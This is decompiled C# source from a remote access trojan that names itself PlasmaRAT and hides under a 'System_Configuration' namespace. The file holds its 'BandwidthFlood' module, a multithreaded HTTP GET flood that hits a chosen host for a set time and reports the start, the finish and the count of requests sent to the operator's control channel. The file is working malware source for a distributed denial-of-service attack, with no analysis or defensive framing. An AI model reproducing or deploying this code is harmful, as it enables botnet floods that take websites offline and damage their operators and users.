using System;
using System.Diagnostics;
using System.Net;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace System_Configuration
{
	// Token: 0x02000008 RID: 8
	[StandardModule]
	public sealed class BandwidthFlood
	{
		// Token: 0x06000019 RID: 25 RVA: 0x00003530 File Offset: 0x00001730
		public static void StartHTTPGet(string Host, int Threadsto, int Time)
		{
			if (!BandwidthFlood.AttackRunning)
			{
				BandwidthFlood.AttackRunning = true;
				BandwidthFlood.HostToAttack = Host;
				BandwidthFlood.ThreadstoUse = Threadsto;
				BandwidthFlood.TimetoAttack = Time;
				BandwidthFlood.Threads = new Thread[Threadsto - 1 + 1];
				PlasmaRAT.TalktoChannel("HTTP GET Attack on " + BandwidthFlood.HostToAttack + " started!", "");
				int num = 0;
				int num2 = Threadsto - 1;
				for (int i = num; i <= num2; i++)
				{
					BandwidthFlood.Threads[i] = new Thread(new ThreadStart(BandwidthFlood.DoWork));
					BandwidthFlood.Threads[i].IsBackground = true;
					BandwidthFlood.Threads[i].Start();
				}
			}
			else
			{
				PlasmaRAT.TalktoChannel("A HTTP GET Attack is Already Running on " + BandwidthFlood.HostToAttack, "");
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000035F4 File Offset: 0x000017F4
		private static void lol()
		{
			BandwidthFlood.ThreadsEnded = Operators.AddObject(BandwidthFlood.ThreadsEnded, 1);
			if (Operators.ConditionalCompareObjectEqual(BandwidthFlood.ThreadsEnded, BandwidthFlood.ThreadstoUse, false))
			{
				BandwidthFlood.ThreadsEnded = 0;
				BandwidthFlood.ThreadstoUse = 0;
				BandwidthFlood.AttackRunning = false;
				PlasmaRAT.TalktoChannel("HTTP GET Attack on " + BandwidthFlood.HostToAttack + " finished successfully. Attacks Sent: " + BandwidthFlood.Attacks.ToString(), "");
				BandwidthFlood.Attacks = 0;
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00003674 File Offset: 0x00001874
		public static void StopHTTPGET()
		{
			if (BandwidthFlood.AttackRunning)
			{
				int num = 0;
				int num2 = BandwidthFlood.ThreadstoUse - 1;
				for (int i = num; i <= num2; i++)
				{
					try
					{
						BandwidthFlood.Threads[i].Abort();
					}
					catch (Exception ex)
					{
					}
				}
				BandwidthFlood.AttackRunning = false;
				PlasmaRAT.TalktoChannel("HTTP GET Attack on " + BandwidthFlood.HostToAttack + " aborted successfully. Attacks Sent: " + BandwidthFlood.Attacks.ToString(), "");
				BandwidthFlood.Attacks = 0;
			}
			else
			{
				PlasmaRAT.TalktoChannel("No HTTP GET Attack is Running!", "");
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00003710 File Offset: 0x00001910
		private static void DoWork()
		{
			try
			{
				WebClient webClient = new WebClient();
				TimeSpan t = TimeSpan.FromSeconds((double)BandwidthFlood.TimetoAttack);
				Stopwatch stopwatch = Stopwatch.StartNew();
				while (stopwatch.Elapsed < t)
				{
					try
					{
						webClient.DownloadString(BandwidthFlood.HostToAttack);
						webClient.Dispose();
						BandwidthFlood.Attacks++;
					}
					catch (Exception ex)
					{
					}
				}
			}
			catch (Exception ex2)
			{
			}
			BandwidthFlood.lol();
		}

		// Token: 0x0400001D RID: 29
		private static object ThreadsEnded = 0;

		// Token: 0x0400001E RID: 30
		private static string HostToAttack;

		// Token: 0x0400001F RID: 31
		private static int TimetoAttack;

		// Token: 0x04000020 RID: 32
		private static int ThreadstoUse;

		// Token: 0x04000021 RID: 33
		private static Thread[] Threads;

		// Token: 0x04000022 RID: 34
		private static bool AttackRunning = false;

		// Token: 0x04000023 RID: 35
		private static int Attacks = 0;
	}
}
